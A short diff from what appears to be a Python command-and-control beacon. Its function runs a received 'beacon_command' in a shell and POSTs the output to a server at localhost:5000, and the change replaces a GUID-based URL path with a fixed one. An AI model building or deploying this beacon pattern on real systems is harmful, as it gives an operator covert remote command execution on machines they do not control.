@@ -15,7 +15,7 @@ def bleh(beacon_command, GUID):
     process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
     out, err = process.communicate()
     out = out.decode()
-    requests.post(f'http://localhost:5000/{GUID}', data=out, headers=headers)
+    requests.post('http://localhost:5000/schema', data=out, headers=headers)
 
 GUID = uuid.uuid4()
 GUID = GUID.int
